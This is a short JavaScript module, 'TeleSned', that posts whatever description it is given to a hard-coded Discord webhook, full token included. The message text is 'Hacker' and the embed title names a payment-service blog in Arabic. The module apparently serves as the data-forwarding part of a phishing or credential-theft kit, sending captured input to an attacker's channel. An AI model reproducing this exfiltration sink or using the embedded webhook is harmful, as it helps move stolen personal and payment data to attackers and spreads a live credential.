import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322339253467877487/wjsmoqFYodfPjsM2zEBlX0wSe7ZWAd0gLkzM2dIZm2P-rN8hrGwLGefmfU90yjLlFQ7Q",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
